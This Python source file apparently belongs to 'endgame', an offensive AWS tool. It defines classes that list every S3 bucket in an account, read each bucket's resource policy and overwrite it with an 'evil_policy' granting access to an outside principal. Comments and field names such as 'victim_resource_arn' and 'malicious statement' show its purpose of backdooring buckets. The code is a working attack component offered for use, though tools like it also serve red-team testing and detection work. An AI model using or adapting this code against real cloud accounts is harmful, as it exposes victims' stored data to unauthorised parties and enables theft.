import logging
import json
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseMessage

logger = logging.getLogger(__name__)


class S3Bucket(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        service = "s3"
        resource_type = "bucket"
        super().__init__(name, resource_type, service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:::{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        """Get the resource based policy for this resource and store it"""
        try:
            response = self.client.get_bucket_policy(Bucket=self.name)
            policy = json.loads(response.get("Policy"))
        except botocore.exceptions.ClientError:
            # This occurs when there is no resource policy attached
            # So let's return a policy that won't break anything but we can add our malicious statement onto
            policy = constants.get_empty_policy()
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        new_policy = json.dumps(evil_policy)
        try:
            self.client.put_bucket_policy(Bucket=self.name, Policy=new_policy)
            message = "success"
        except botocore.exceptions.ClientError as error:
            message = str(error)
        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=evil_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message


class S3Buckets(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "s3"
        self.resource_type = "bucket"

    @property
    def resources(self) -> list[ListResourcesResponse]:
        """Get a list of these resources"""
        response = self.client.list_buckets()
        resources = []
        for resource in response.get("Buckets"):
            name = resource.get("Name")
            arn = f"arn:aws:{self.service}:::{name}"
            list_resources_response = ListResourcesResponse(
                service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                resource_type=self.resource_type, name=name)
            resources.append(list_resources_response)
        return resources
